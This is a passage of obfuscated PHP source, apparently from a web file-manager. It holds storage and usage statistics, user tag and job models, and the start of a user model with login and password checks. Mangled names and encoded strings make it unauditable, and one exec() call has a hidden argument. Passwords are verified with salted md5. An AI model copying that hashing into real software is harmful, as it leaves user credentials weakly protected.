LNG($Œå¸ÅÉÑ[1930]), $Œå¸ÅÉÑ[1915] => LNG($Œå¸ÅÉÑ[1931]), $Œå¸ÅÉÑ[1916] => LNG($Œå¸ÅÉÑ[1932]))); $§ÛÜ£İş = array($Œå¸ÅÉÑ[662] => $Œå¸ÅÉÑ[1933], $Œå¸ÅÉÑ[1912] => $Œå¸ÅÉÑ[79]); if (empty($’ÔÙÃ–‚)) { $™ş„‹ğÕ = date($Œå¸ÅÉÑ[1917], strtotime($Œå¸ÅÉÑ[1918])); $ä„œ´ü¥ = array($Œå¸ÅÉÑ[255] => $™ş„‹ğÕ); foreach ($‡Û·ß¨ı[$Ş–»¡Ö] as $¿òÕİ™­ => $½ß½µéú) { $ä„œ´ü¥[$¿òÕİ™­] = 0; } $’ÔÙÃ–‚[] = $ä„œ´ü¥; } $îöÏó—Ò = array(); foreach ($’ÔÙÃ–‚ as $½ß½µéú) { if ($Ş–»¡Ö == $Œå¸ÅÉÑ[1912] && $½ß½µéú[$Œå¸ÅÉÑ[1914]] > $½ß½µéú[$Œå¸ÅÉÑ[846]]) { $½ß½µéú[$Œå¸ÅÉÑ[1914]] = $½ß½µéú[$Œå¸ÅÉÑ[846]]; } foreach ($‡Û·ß¨ı[$Ş–»¡Ö] as $¿òÕİ™­ => $¾²É•ˆ×) { $Ã˜ÓÅ±Ô = array($Œå¸ÅÉÑ[255] => $½ß½µéú[$Œå¸ÅÉÑ[255]], $Œå¸ÅÉÑ[1671] => $¾²É•ˆ×); $Ã˜ÓÅ±Ô[$§ÛÜ£İş[$Ş–»¡Ö]] = isset($½ß½µéú[$¿òÕİ™­]) ? $½ß½µéú[$¿òÕİ™­] : 0; $îöÏó—Ò[] = $Ã˜ÓÅ±Ô; } } return $îöÏó—Ò; } public function validDate($ú¹ÕÉÖ , $÷ë’éİõ) { $Éù¼Ï¾­ =& $_SERVER[íïàËŸë]; $íñƒõ²ª = date($Éù¼Ï¾­[1917], strtotime($Éù¼Ï¾­[1918])); $ú›ää‚Ó = array($íñƒõ²ª); switch ($ú¹ÕÉÖ ) { case $Éù¼Ï¾­[1762]: $á«ù­à = mktime(0, 0, 0, date($Éù¼Ï¾­[1934]), date($Éù¼Ï¾­[1460]) - date($Éù¼Ï¾­[1550]) + 7 - 7, date($Éù¼Ï¾­[1935])); $íî­ÀÒ‰ = 0; do { $Í­œÖ° = date($Éù¼Ï¾­[1917], $á«ù­à - 3600 * 24 * 7 * $íî­ÀÒ‰); $ú›ää‚Ó[] = $Í­œÖ°; $íî­ÀÒ‰++; } while ($÷ë’éİõ < $Í­œÖ°); break; case $Éù¼Ï¾­[1760]: $íî­ÀÒ‰ = 1; do { $Ñß’¥ë— = date($Éù¼Ï¾­[1936], strtotime("\x2d\x20{$íî­ÀÒ‰}\x20\155\x6f\156\x74\x68\163")); $ú›ää‚Ó[] = $Ñß’¥ë—; $íî­ÀÒ‰++; } while ($÷ë’éİõ < $Ñß’¥ë—); break; case $Éù¼Ï¾­[1937]: $ã‹„¸ï„ = (int) date($Éù¼Ï¾­[1935], strtotime($÷ë’éİõ)); $°«Éè” = (int) date($Éù¼Ï¾­[1935]); if ($ã‹„¸ï„ >= $°«Éè”) { break; } for ($ã‹„¸ï„; $ã‹„¸ï„ < $°«Éè”; $ã‹„¸ï„++) { $ú›ää‚Ó[] = $ã‹„¸ï„ . $Éù¼Ï¾­[1938]; } break; default: break; } if ($÷ë’éİõ > end($ú›ää‚Ó)) { array_pop($ú›ää‚Ó); } sort($ú›ää‚Ó); return $ú›ää‚Ó; } public function listTable($ÎÁ“ÙÍ) { $ÍĞ‚•ªÇ = ucfirst($ÎÁ“ÙÍ); return Model($ÍĞ‚•ªÇ)->listData(); } public function option($êĞ›²‹Ô) { $”şÁÆäÌ = $_SERVER[íïàËŸë][1939] . ucfirst($êĞ›²‹Ô); return $this->{$”şÁÆäÌ}(); } private function optionUser() { $£““üÃš =& $_SERVER[íïàËŸë]; $—ñ±Öı® = Model($£““üÃš[598])->count($£““üÃš[1782]); $•âİÚ°ù = Model($£““üÃš[598])->where($£““üÃš[1940])->count($£““üÃš[1782]); $´ï‡òÎ¶ = intval($GLOBALS[$£““üÃš[6]][$£““üÃš[425]][$£““üÃš[1728]]) / 3600; $ò·Ä—®Æ = strtotime("\55{$´ï‡òÎ¶}\40\x68\157\x75\162\x73"); $ÔÁ¼ø„ı = strtotime(date($£““üÃš[1921])); if ($ò·Ä—®Æ < $ÔÁ¼ø„ı) { $ò·Ä—®Æ = $ÔÁ¼ø„ı; } $ÀæŠê¹Á = array($£““üÃš[1941] => array($£““üÃš[1103], $ò·Ä—®Æ)); $¯ç£ï÷Î = (int) Model($£““üÃš[598])->where($ÀæŠê¹Á)->count($£““üÃš[1782]); if (!$¯ç£ï÷Î) { $¯ç£ï÷Î = 1; } $ÀæŠê¹Á = array($£““üÃš[1941] => array($£““üÃš[1103], $ÔÁ¼ø„ı)); $±Ú«Ö–­ = Model($£““üÃš[598])->where($ÀæŠê¹Á)->count($£““üÃš[1782]); return array($£““üÃš[841] => (int) $—ñ±Öı®, $£““üÃš[1942] => (int) ($—ñ±Öı® - $•âİÚ°ù), $£““üÃš[1943] => (int) $•âİÚ°ù, $£““üÃš[1944] => (int) $±Ú«Ö–­, $£““üÃš[1945] => $¯ç£ï÷Î); } private function optionFile() { $Ê¢ÕæÃ =& $_SERVER[íïàËŸë]; $¨ÈòÎÍ = $this->sourceSize(); $Ö›­¼õ¼ = $¨ÈòÎÍ[$Ê¢ÕæÃ[79]]; $ƒà•°Ï = $¨ÈòÎÍ[$Ê¢ÕæÃ[1914]]; $–íëš£ª = Model($Ê¢ÕæÃ[907])->where(array($Ê¢ÕæÃ[485] => 0))->count($Ê¢ÕæÃ[193]); $¨äòã± = array($Ê¢ÕæÃ[485] => 0, $Ê¢ÕæÃ[231] => array($Ê¢ÕæÃ[1103], strtotime(date($Ê¢ÕæÃ[1921])))); $î¿¥£ä™ = Model($Ê¢ÕæÃ[907])->where($¨äòã±)->sum($Ê¢ÕæÃ[79]); $‚ìœ¶¸Ÿ = Model($Ê¢ÕæÃ[907])->where($¨äòã±)->count($Ê¢ÕæÃ[193]); return array($Ê¢ÕæÃ[846] => $Ö›­¼õ¼, $Ê¢ÕæÃ[1914] => $ƒà•°Ï, $Ê¢ÕæÃ[1946] => $Ö›­¼õ¼ - $ƒà•°Ï, $Ê¢ÕæÃ[1947] => (int) $î¿¥£ä™, $Ê¢ÕæÃ[848] => (int) $–íëš£ª, $Ê¢ÕæÃ[1948] => (int) $‚ìœ¶¸Ÿ); } private function optionAccess() { $ªÇ…ØßÚ =& $_SERVER[íïàËŸë]; return array($ªÇ…ØßÚ[841] => $this->typeLogCnt(), $ªÇ…ØßÚ[110] => $this->typeLogCnt($ªÇ…ØßÚ[110]), $ªÇ…ØßÚ[525] => $this->typeLogCnt($ªÇ…ØßÚ[525]), $ªÇ…ØßÚ[1949] => $this->typeLogCnt($ªÇ…ØßÚ[1949]), $ªÇ…ØßÚ[1950] => $this->typeLogCnt($ªÇ…ØßÚ[1950]), $ªÇ…ØßÚ[662] => $this->typeLogCnt($ªÇ…ØßÚ[12], $ªÇ…ØßÚ[1925])); } private function typeLogCnt($ÎÆºÂøŸ = '', $µ—ÕÊüã = "\151\144") { $Ø¦áéß¹ =& $_SERVER[íïàËŸë]; $ÂÖ÷½¡¥ = array($Ø¦áéß¹[110] => array($Ø¦áéß¹[1951], $Ø¦áéß¹[1952]), $Ø¦áéß¹[525] => array($Ø¦áéß¹[1953], $Ø¦áéß¹[1954]), $Ø¦áéß¹[1949] => array($Ø¦áéß¹[1955], $Ø¦áéß¹[1956], $Ø¦áéß¹[1957]), $Ø¦áéß¹[1950] => array($Ø¦áéß¹[1958], $Ø¦áéß¹[1959]), $Ø¦áéß¹[1960] => array($Ø¦áéß¹[1961], $Ø¦áéß¹[1962], $Ø¦áéß¹[1963])); $¯Ú®ÂÓ = strtotime(date($Ø¦áéß¹[1921])); $ö¥´èÅï = array($Ø¦áéß¹[231] => array($Ø¦áéß¹[1103], $¯Ú®ÂÓ)); if ($ÎÆºÂøŸ) { $ö¥´èÅï[$Ø¦áéß¹[33]] = array($Ø¦áéß¹[7], $ÂÖ÷½¡¥[$ÎÆºÂøŸ]); } $ğî³§¼ = Model($Ø¦áéß¹[1924])->where($ö¥´èÅï)->count($µ—ÕÊüã); return (int) $ğî³§¼; } private function optionServer() { $Ü´âùØ =& $_SERVER[íïàËŸë]; $¾’ğšÆò = $this->diskDriver(); $ŸÀîÉÚ = KodIO::defaultDriver(); $ßë¢öÇË = array($Ü´âùØ[900] => $ŸÀîÉÚ[$Ü´âùØ[475]]); $éâôèœ = Model($Ü´âùØ[544])->where($ßë¢öÇË)->sum($Ü´âùØ[79]); $…ı ’í = explode($Ü´âùØ[53], $_SERVER[$Ü´âùØ[147]]); $±¬ã°ö¨ = $…ı ’í[0]; $·ìõ¦ = $GLOBALS[$Ü´âùØ[6]][$Ü´âùØ[21]]; $²½ğšÕ¸ = $·ìõ¦[$Ü´âùØ[1065]]; if ($²½ğšÕ¸ == $Ü´âùØ[1053]) { $¯š‹¿¾ = explode($Ü´âùØ[1379], $·ìõ¦[$Ü´âùØ[1064]]); $²½ğšÕ¸ = $¯š‹¿¾[0]; } if ($²½ğšÕ¸ == $Ü´âùØ[1001] || $²½ğšÕ¸ == $Ü´âùØ[887]) { $Æû¾¥ƒ› = Model()->db()->query($Ü´âùØ[1964]); $Ç½¸¨‹ = $Æû¾¥ƒ›[0] && isset($Æû¾¥ƒ›[0][$Ü´âùØ[1670]]) ? $Æû¾¥ƒ›[0][$Ü´âùØ[1670]] : 0; $²½ğšÕ¸ = $Ü´âùØ[1965] . ($Ç½¸¨‹ ? $Ü´âùØ[8] . $Ç½¸¨‹ : $Ü´âùØ[12]); } $‡Ï‰Ü€— = $GLOBALS[$Ü´âùØ[6]][$Ü´âùØ[425]][$Ü´âùØ[916]]; return array($Ü´âùØ[1966] => $¾’ğšÆò ? $¾’ğšÆò[$Ü´âùØ[1967]] : 0, $Ü´âùØ[1968] => $¾’ğšÆò ? $¾’ğšÆò[$Ü´âùØ[1969]] : 0, $Ü´âùØ[1970] => (int) $ŸÀîÉÚ[$Ü´âùØ[1967]] * 1024 * 1024 * 1024, $Ü´âùØ[1971] => (int) $éâôèœ, $Ü´âùØ[1972] => ucfirst($±¬ã°ö¨), $Ü´âùØ[1973] => $Ü´âùØ[1974] . PHP_VERSION, $Ü´âùØ[1975] => phpBuild64() ? 64 : 32, $Ü´âùØ[840] => str_replace($Ü´âùØ[1222], $Ü´âùØ[1081], $²½ğšÕ¸), $Ü´âùØ[425] => ucfirst($‡Ï‰Ü€—), $Ü´âùØ[32] => $_SERVER[$Ü´âùØ[1976]]); } private function diskDriver() { $ßñĞ³™˜ =& $_SERVER[íïàËŸë]; $°Óæ¶Ñî = $ßñĞ³™˜[8]; $´¤‡ÑØß = $GLOBALS[$ßñĞ³™˜[6]][$ßñĞ³™˜[1396]] == $ßñĞ³™˜[1397]; if ($´¤‡ÑØß) { $°Óæ¶Ñî = $ßñĞ³™˜[1977]; if (function_exists($ßñĞ³™˜[1978])) { exec($ßñĞ³™˜[1979], $ñ”ğ¯âò); $°Óæ¶Ñî = $ñ”ğ¯âò[1] . $ßñĞ³™˜[8]; } } if (!file_exists($°Óæ¶Ñî)) { return; } $ÎÅ•ˆ¥ = @disk_total_space($°Óæ¶Ñî); $ğˆÛİÕ¼ = $ÎÅ•ˆ¥ - @disk_free_space($°Óæ¶Ñî); return array($ßñĞ³™˜[1967] => $ÎÅ•ˆ¥, $ßñĞ³™˜[1969] => $ğˆÛİÕ¼); } public function fileChart($§Œø˜à•) { $Ğö–õ =& $_SERVER[íïàËŸë]; if (isset($§Œø˜à•[$Ğö–õ[1782]])) { return Model($Ğö–õ[907])->userFileTypeProfile($§Œø˜à•[$Ğö–õ[1782]]); } if (isset($§Œø˜à•[$Ğö–õ[1980]])) { return Model($Ğö–õ[907])->groupFileTypeProfile($§Œø˜à•[$Ğö–õ[1980]]); } $ª Ñ¥Á¶ = $this->sourceSize(); $Ïí­ä·Ÿ = array($Ğö–õ[192] => 0, $Ğö–õ[190] => 1); $ìÖÃœ¨™ = Model($Ğö–õ[907])->where($Ïí­ä·Ÿ)->sum($Ğö–õ[79]); $Ïí­ä·Ÿ[$Ğö–õ[190]] = 2; $­Ğ¿ìéÒ = Model($Ğö–õ[907])->where($Ïí­ä·Ÿ)->sum($Ğö–õ[79]); return array($Ğö–õ[846] => $ª Ñ¥Á¶[$Ğö–õ[79]], $Ğö–õ[1914] => $ª Ñ¥Á¶[$Ğö–õ[1914]], $Ğö–õ[1915] => (int) $ìÖÃœ¨™, $Ğö–õ[1916] => (int) $­Ğ¿ìéÒ); } private function sourceSize() { $Ç©é¼‹¥ =& $_SERVER[íïàËŸë]; $­ü—¡ú = Model($Ç©é¼‹¥[907])->where(array($Ç©é¼‹¥[485] => 0))->sum($Ç©é¼‹¥[79]); $®¸¸ÙÓñ = Model($Ç©é¼‹¥[544])->sum($Ç©é¼‹¥[79]); if ($®¸¸ÙÓñ > $­ü—¡ú) { $®¸¸ÙÓñ = $­ü—¡ú; } return array($Ç©é¼‹¥[79] => (int) $­ü—¡ú, $Ç©é¼‹¥[1914] => (int) $®¸¸ÙÓñ); } } goto D±ÖŠåå‚à; EÛÑ¸ˆã¡„: class UserTagModel extends ModelBaseLight { public $optionType = "\125\x73\145\162\56\164\x61\x67\114\x69\163\x74"; public $modelType = "\125\x73\x65\x72\x4f\x70\164\151\x6f\x6e"; public $field = array("\156\x61\x6d\145", "\x73\164\171\x6c\145", "\163\157\162\x74"); public function listData($İğÎ´ş = false, $‹·Ä¼Œ» = "\x73\x6f\162\164", $Æ…Ä‚ı = false) { return parent::listData($İğÎ´ş, $‹·Ä¼Œ», $Æ…Ä‚ı); } public function remove($öó›¸ÇĞ) { return parent::remove($öó›¸ÇĞ); } public function add($îİŸ×ú, $ˆõ÷àèå = "\x6c\x61\x62\145\154\55\x67\x72\x65\171\x2d\156\157\x72\155\141\x6c") { $ä‘†µíÒ =& $_SERVER[íïàËŸë]; if ($this->findByName($îİŸ×ú)) { return !1; } $åÒ”®÷Ë = array($ä‘†µíÒ[494] => $îİŸ×ú, $ä‘†µíÒ[558] => $ˆõ÷àèå, $ä‘†µíÒ[1984] => $this->getSort($ä‘†µíÒ[335]) + 1); return parent::insert($åÒ”®÷Ë); } public function update($¯õëö, $éÓÔç²¯) { $Ü²‘™¦ =& $_SERVER[íïàËŸë]; $ Ø³æ˜ = $this->listData($¯õëö); $äÅÉ²»ì = $this->findByName($éÓÔç²¯[$Ü²‘™¦[32]]); if (!$ Ø³æ˜ || $äÅÉ²»ì && $äÅÉ²»ì[$Ü²‘™¦[475]] != $ Ø³æ˜[$Ü²‘™¦[475]]) { return !1; } return parent::update($¯õëö, $éÓÔç²¯); } public function moveTop($¾²ğ„û) { $Šª°Å’½ =& $_SERVER[íïàËŸë]; $à÷Ö©À‘ = parent::listData(); $îãåşá‰ = $this->getSort($Šª°Å’½[334]); foreach ($à÷Ö©À‘ as &$¢Ø”Õ¯) { if ($¢Ø”Õ¯[$Šª°Å’½[475]] == $¾²ğ„û) { $¢Ø”Õ¯[$Šª°Å’½[2004]] = $îãåşá‰; continue; } $¢Ø”Õ¯[$Šª°Å’½[2004]] += 1; } unset($¢Ø”Õ¯); return parent::resetData($à÷Ö©À‘); } public function moveBottom($„Şßáßã) { $÷ÄÄœ‹‘ =& $_SERVER[íïàËŸë]; $«û£¯› = $this->getSort($÷ÄÄœ‹‘[335]) + 1; return parent::update($„Şßáßã, array($÷ÄÄœ‹‘[2004] => $«û£¯›)); } public function resetSort($˜Ä¡¨¥) { $«ÑÑ¨İ =& $_SERVER[íïàËŸë]; $ş–ÜŸ­İ = array(); $˜Ä¡¨¥ = is_array($˜Ä¡¨¥) ? $˜Ä¡¨¥ : array(); for ($ûí¤ĞşÍ = 0; $ûí¤ĞşÍ < count($˜Ä¡¨¥); $ûí¤ĞşÍ++) { $ş–ÜŸ­İ[$˜Ä¡¨¥[$ûí¤ĞşÍ] . $«ÑÑ¨İ[12]] = $ûí¤ĞşÍ + 1; } $¾ô„çÖ± = parent::listData(); foreach ($¾ô„çÖ± as &$ïò°öÑõ) { $ı’éªˆ‹ = $ş–ÜŸ­İ[$ïò°öÑõ[$«ÑÑ¨İ[475]]]; $ïò°öÑõ[$«ÑÑ¨İ[2004]] = $ı’éªˆ‹ ? $ı’éªˆ‹ : $ïò°öÑõ[$«ÑÑ¨İ[2004]]; } unset($ïò°öÑõ); return parent::resetData($¾ô„çÖ±); } private function getSort($í“ï‹) { $Î¼…Ù¯ =& $_SERVER[íïàËŸë]; $”®Õ¸ïÁ = parent::listData(); $¬šíîé‹ = array_to_keyvalue($”®Õ¸ïÁ, $Î¼…Ù¯[12], $Î¼…Ù¯[2004]); if (!$¬šíîé‹) { $¬šíîé‹ = array(0); } $½ËøÉ£Ó = $í“ï‹ == $Î¼…Ù¯[335] ? max($¬šíîé‹) : min($¬šíîé‹); return intval($½ËøÉ£Ó); } } goto DÔ·îÔÜ; f¡é¼·†éì: class UserJobModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\145\155\x2e\152\x6f\x62\x4c\151\x73\164"; public $field = array("\x6e\x61\155\145", "\144\x65\x73\143", "\x73\157\x72\164"); const JOB_KEY = "\163\x65\154\x66\x4a\157\x62\114\x69\x73\x74"; public function listData($›Í×İû­ = false, $åË‘Ïê° = "\x73\157\162\x74", $Ğ«Üµ¨ = false) { return parent::listData($›Í×İû­, $åË‘Ïê°, $Ğ«Üµ¨); } public function remove($’ŞÈ·œŸ) { return parent::remove($’ŞÈ·œŸ); } public function add($Å„ş³û) { $’½¼‚‘ø =& $_SERVER[íïàËŸë]; if ($this->findByName($Å„ş³û[$’½¼‚‘ø[32]])) { return !1; } $Å„ş³û[$’½¼‚‘ø[2004]] = $this->getSort(); return parent::insert($Å„ş³û); } private function getSort() { $Å¶¯ê‘  =& $_SERVER[íïàËŸë]; $œõäÌó¸ = parent::listData(); $Ïœ›¦» = array_to_keyvalue($œõäÌó¸, $Å¶¯ê‘ [12], $Å¶¯ê‘ [2004]); return empty($Ïœ›¦») ? 0 : max($Ïœ›¦») + 1; } public function update($šñ²µÒÚ, $¼ô³–) { $ìáÌÔ¥• =& $_SERVER[íïàËŸë]; $¯ñß¶ = parent::listData($šñ²µÒÚ); $ÖåßÂÛ = $this->findByName($¼ô³–[$ìáÌÔ¥•[32]]); if (!$¯ñß¶ || $ÖåßÂÛ && $ÖåßÂÛ[$ìáÌÔ¥•[475]] != $¯ñß¶[$ìáÌÔ¥•[475]]) { return !1; } return parent::update($šñ²µÒÚ, $¼ô³–); } public function setUserJob($Ó‰ §¥, $™÷ö¿ì) { $ëÛ­Èšé =& $_SERVER[íïàËŸë]; if (!is_array($™÷ö¿ì)) { $™÷ö¿ì = array($™÷ö¿ì); } $­–ş‹Œú = parent::listData(); $¶¡ÊÏ‘ = array_to_keyvalue($­–ş‹Œú, $ëÛ­Èšé[32]); $‡£ıéÍş = $ëÛ­Èšé[454]; foreach ($™÷ö¿ì as $‡•ê”æ) { if ($¶¡ÊÏ‘[$‡•ê”æ]) { $‡£ıéÍş .= $¶¡ÊÏ‘[$‡•ê”æ][$ëÛ­Èšé[475]] . $ëÛ­Èšé[50]; } else { $ÙøáÍÉÔ = $this->add($‡•ê”æ); $‡£ıéÍş .= $ÙøáÍÉÔ . $ëÛ­Èšé[50]; } } $‡£ıéÍş = rtrim($‡£ıéÍş, $ëÛ­Èšé[50]); Model($ëÛ­Èšé[598])->metaSet($Ó‰ §¥, self::JOB_KEY, $‡£ıéÍş); } public function getUserJob($›Æß‘¸¼) { $äø·ôº» = Model($_SERVER[íïàËŸë][598])->metaGet($›Æß‘¸¼); return $this->getUserJobInfo($äø·ôº»[self::JOB_KEY]); } public function getUserJobInfo($‰Ì¯ô’”) { $‘ò¹æÍ =& $_SERVER[íïàËŸë]; $‰”Éò–£ = explode($‘ò¹æÍ[50], $‰Ì¯ô’”); $Óù¾Ê™é = parent::listData(); $Óù¾Ê™é = array_remove_key($Óù¾Ê™é, $‘ò¹æÍ[231]); $ÊŒ’ï = array(); foreach ($‰”Éò–£ as $«ª©óí°) { if (isset($Óù¾Ê™é[$«ª©óí°])) { $ÊŒ’ï[] = $Óù¾Ê™é[$«ª©óí°]; } } return $ÊŒ’ï; } } class UserModel extends ModelBase { protected $tableName = "\165\x73\145\x72"; protected $tableMeta = array("\164\x61\142\x6c\145\116\x61\x6d\x65" => "\x75\163\x65\162\137\x6d\145\x74\141", "\155\x65\164\x61\106\151\145\154\x64" => "\165\x73\x65\x72\x49\x44"); protected $simpleField = "\165\163\145\x72\111\x44\54\x6e\151\x63\153\116\141\155\145\x2c\156\x61\155\145\54\141\166\141\164\x61\x72\54\x73\145\x78\54\x73\x74\x61\x74\x75\163"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($¹ÉœÌÇ–) { $Ö•Ä«Å® =& $_SERVER[íïàËŸë]; $“Üø™¤Š = $Ö•Ä«Å®[2459]; return array($Ö•Ä«Å®[2062] => array($¹ÉœÌÇ–[0], $“Üø™¤Š), $Ö•Ä«Å®[2064] => array($¹ÉœÌÇ–[0], $“Üø™¤Š), $Ö•Ä«Å®[2460] => array($¹ÉœÌÇ–[0], $“Üø™¤Š)); } protected function getInfo($Ìƒş„íæ, $ š‰®µâ = false) { $¦ö·çØÃ = $this->getInfoSimple($Ìƒş„íæ); if (!is_array($¦ö·çØÃ)) { return array(); } if ($ š‰®µâ) { return $this->_getInfoApply($¦ö·çØÃ); } return $this->cacheFunctionGet($_SERVER[íïàËŸë][2066], $Ìƒş„íæ); } protected function getInfoFull($¨Ìüéò, $ÂÍê‚”­ = false) { $Ş§×”àã = $this->getInfoSimple($¨Ìüéò); if (!is_array($Ş§×”àã)) { return array(); } if ($ÂÍê‚”­) { return $this->_getInfoApply($Ş§×”àã, !0); } return $this->cacheFunctionGet($_SERVER[íïàËŸë][2461], $¨Ìüéò); } private function _getInfoApply($‘¡Î¯¨á, $ë¿ºã©À = false) { $ìßÁ¼¡í =& $_SERVER[íïàËŸë]; if (!$‘¡Î¯¨á) { return $‘¡Î¯¨á; } $ú¥ı¬¹ = md5($ìßÁ¼¡í[2462] . $‘¡Î¯¨á[$ìßÁ¼¡í[978]] . $ìßÁ¼¡í[2463] . $‘¡Î¯¨á[$ìßÁ¼¡í[32]]); $‘¡Î¯¨á = $this->_listDataApplyItem($‘¡Î¯¨á); $òÀ‚Üè = Model($ìßÁ¼¡í[1428])->metaGet($‘¡Î¯¨á[$ìßÁ¼¡í[90]][$ìßÁ¼¡í[193]]); $‘¡Î¯¨á[$ìßÁ¼¡í[2464]] = $ú¥ı¬¹; $‘¡Î¯¨á[$ìßÁ¼¡í[90]][$ìßÁ¼¡í[2260]] = isset($òÀ‚Üè[$ìßÁ¼¡í[2261]]) ? $òÀ‚Üè[$ìßÁ¼¡í[2261]] : null; if ($ë¿ºã©À) { $‘¡Î¯¨á[$ìßÁ¼¡í[539]] = $this->metaGet($‘¡Î¯¨á[$ìßÁ¼¡í[1782]]); } return $‘¡Î¯¨á; } protected function getInfoSimple($šÓ·Â¾, $çš…¼¢ = false) { $ƒ©ÓÛ³÷ =& $_SERVER[íïàËŸë]; if (!$šÓ·Â¾) { return array(); } if ($çš…¼¢) { $ÚĞõ»ıñ = $this->where(array($ƒ©ÓÛ³÷[1782] => intval($šÓ·Â¾)))->find(); if (!is_array($ÚĞõ»ıñ)) { return array(); } $ÚĞõ»ıñ[$ƒ©ÓÛ³÷[2465]] = Action($ƒ©ÓÛ³÷[2466])->parseUrl($ÚĞõ»ıñ[$ƒ©ÓÛ³÷[2465]]); return $ÚĞõ»ıñ; } return $this->cacheFunctionGet($ƒ©ÓÛ³÷[2067], $šÓ·Â¾); } protected function getInfoSimpleOuter($şİËÍóÄ) { $„úàÖëõ =& $_SERVER[íïàËŸë]; if (!$şİËÍóÄ || $şİËÍóÄ == 0) { return array($„úàÖëõ[1782] => $„úàÖëõ[228], $„úàÖëõ[32] => $„úàÖëõ[176] . LNG($„úàÖëõ[2467]) . $„úàÖëõ[178], $„úàÖëõ[2465] => STATIC_PATH . $„úàÖëõ[2468]); } $Ûª¾Âå = $this->cacheFunctionGet($„úàÖëõ[2067], $şİËÍóÄ); $§•­Ã­ş = array_field_key($Ûª¾Âå, explode($„úàÖëõ[50], $this->simpleField)); if (!$§•­Ã­ş) { return array($„úàÖëõ[1782] => $„úàÖëõ[1284], $„úàÖëõ[32] => $„úàÖëõ[176] . LNG($„úàÖëõ[2469]) . $„úàÖëõ[178], $„úàÖëõ[2465] => STATIC_PATH . $„úàÖëõ[2470]); } $§•­Ã­ş[$„úàÖëõ[2465]] = Action($„úàÖëõ[2466])->parseUrl($§•­Ã­ş[$„úàÖëõ[2465]]); return $§•­Ã­ş; } protected function groupUser($ˆÊİˆ¿‚) { } public static function errorLang($î´èãŒ) { $˜¯ËÂ’– =& $_SERVER[íïàËŸë]; $½ö—õŒ® = array(self::ERROR_USER_NOT_EXISTS => $˜¯ËÂ’–[2471], self::ERROR_USER_PASSWORD_ERROR => $˜¯ËÂ’–[2472], self::ERROR_USER_EXIST_NAME => $˜¯ËÂ’–[2473], self::ERROR_USER_EXIST_PHONE => $˜¯ËÂ’–[2474], self::ERROR_USER_EXIST_EMAIL => $˜¯ËÂ’–[2475], self::ERROR_USER_LOGIN_LOCK => $˜¯ËÂ’–[2476], self::ERROR_IP_NOT_ALLOW => $˜¯ËÂ’–[2477], self::ERROR_USER_EXIST_NICKNAME => $˜¯ËÂ’–[2478]); $¸ĞİòÆ† = LNG($½ö—õŒ®[$î´èãŒ]); if ($î´èãŒ == self::ERROR_USER_LOGIN_LOCK) { $¯ó™ÚÙ² = (int) Model($˜¯ËÂ’–[2479])->get($˜¯ËÂ’–[2480]); if ($¯ó™ÚÙ² > 60) { $¸ĞİòÆ† = str_replace($˜¯ËÂ’–[91], ceil($¯ó™ÚÙ² / 60), $¸ĞİòÆ†); } } return $¸ĞİòÆ†; } public function getInfoByMeta($Æµ©åÉö, $Í±À¼Ğ) { $Üõ¬üµ =& $_SERVER[íïàËŸë]; $‘ÆÒ§¶ = Model($Üõ¬üµ[2481])->where(array($Üõ¬üµ[97] => $Æµ©åÉö, $Üõ¬üµ[450] => $Í±À¼Ğ))->find(); if ($‘ÆÒ§¶) { return $this->getInfo($‘ÆÒ§¶[$Üõ¬üµ[1782]]); } return !1; } public function userLoginCheck($àÚŞÚ»É, $´ÆÂ°Âé) { $ŠÇÀ¹‚ =& $_SERVER[íïàËŸë]; $Üõø’ = $this->userLoginFind($àÚŞÚ»É); if (!$Üõø’) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($Üõø’[$ŠÇÀ¹‚[1782]], $´ÆÂ°Âé)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($Üõø’[$ŠÇÀ¹‚[1782]]); } public function userLoginFind($â–«à£º) { $ı”İ³şÍ =& $_SERVER[íïàËŸë]; $Ä¼İŒŒ« = array($ı”İ³şÍ[32] => $â–«à£º, $ı”İ³şÍ[2268] => $â–«à£º, $ı”İ³şÍ[381] => $â–«à£º, $ı”İ³şÍ[2482] => $â–«à£º, $ı”İ³şÍ[1089] => $ı”İ³şÍ[1091]); if ($this->nickNameRpt()) { unset($Ä¼İŒŒ«[$ı”İ³şÍ[2268]]); } return $this->where($Ä¼İŒŒ«)->find(); } public function clearCache($ÊãÕƒ¼›) { $·¤ ıÏÌ =& $_SERVER[íïàËŸë]; $this->cacheFunctionClear($·¤ ıÏÌ[2066], $ÊãÕƒ¼›); $this->cacheFunctionClear($·¤ ıÏÌ[2067], $ÊãÕƒ¼›); $this->cacheFunctionClear($·¤ ıÏÌ[2461], $ÊãÕƒ¼›); } public function userPasswordCheck($•ƒ”­ì®, $àÌƒ³“Ç) { $âÅÒ–§ş =& $_SERVER[íïàËŸë]; $³À‰äôø = $this->where(array($âÅÒ–§ş[1782] => intval($•ƒ”­ì®)))->find(); $ªÛŞàìœ = $this->metaGet($•ƒ”­ì®); $Æ’ƒÉ» = isset($ªÛŞàìœ[$âÅÒ–§ş[2483]]) ? $ªÛŞàìœ[$âÅÒ–§ş[2483]] : $âÅÒ–§ş[12]; if (md5($Æ’ƒÉ» . trim($àÌƒ³“Ç)) !== $³À‰äôø[$âÅÒ–§ş[978]]) { return !1; } return !0; } public function userAdd($‘Î¢ÄÏ®) { $•£àËúŒ =& $_SERVER[íïàËŸë]; $·œ‚ÏË¦ = array($•£àËúŒ[494] => $‘Î¢ÄÏ®[$•£àËúŒ[32]], $•£àËúŒ[2484] => $‘Î¢ÄÏ®[$•£àËúŒ[2186]], $•£àËúŒ[2485] => isset($‘Î¢ÄÏ®[$•£àËúŒ[381]]) ? $‘Î¢ÄÏ®[$•£àËúŒ[381]] : $•£àËúŒ[12], $•£àËúŒ[2486] => isset($‘Î¢ÄÏ®[$•£àËúŒ[2482]]) ? $‘Î¢ÄÏ®[$•£àËúŒ[2482]] : $•£àËúŒ[12], $•£àËúŒ[2487] => isset($‘Î¢ÄÏ®[$•£àËúŒ[2268]]) ? $‘Î¢ÄÏ®[$•£àËúŒ[2268]] : 